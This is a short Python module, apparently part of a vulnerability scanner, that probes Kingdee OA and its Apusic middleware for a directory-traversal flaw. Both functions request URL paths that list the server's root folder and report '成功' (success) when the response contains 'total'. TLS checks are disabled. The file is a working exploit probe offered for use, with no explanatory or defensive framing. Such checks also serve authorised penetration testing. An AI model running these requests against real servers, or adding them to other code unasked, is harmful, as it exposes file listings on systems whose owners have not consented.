'''
金蝶OA目录遍历
'''

import requests
from main import hprint, print_blue

def jdOA_path(url, timeout=6):
    print_blue('金蝶OA目录遍历')
    return_data = ''
    # if not url[0:1] == '/':
    #     url = url + '/'
    try:
        re = requests.get(url + '/appmonitor/protected/selector/server_file/files?folder=/&suffix=', timeout=timeout,verify=False)
        # print(re)
        if str(re) == '<Response [200]>':
            if 'total' in re.text:
                return '成功'
    except ConnectionError as e:
        return '连接失败'
    except TimeoutError as e:
        return '连接超时'
    except Exception as e:
        return '未知错误：' + str(e)



def jdOA_path_Apusic(url, timeout=6):
    print_blue('金蝶OA中间件Apusic目录遍历')
    return_data = ''
    # if not url[0:1] == '/':
    #     url = url + '/'
    try:
        re = requests.get(url + '/admin/protected/selector/server_file/files?folder=/', timeout=timeout,verify=False)
        # print(re)
        if 'total' in re.text:
            return '成功'
    except ConnectionError as e:
        return '连接失败'
    except TimeoutError as e:
        return '连接超时'
    except Exception as e:
        return '未知错误：' + str(e)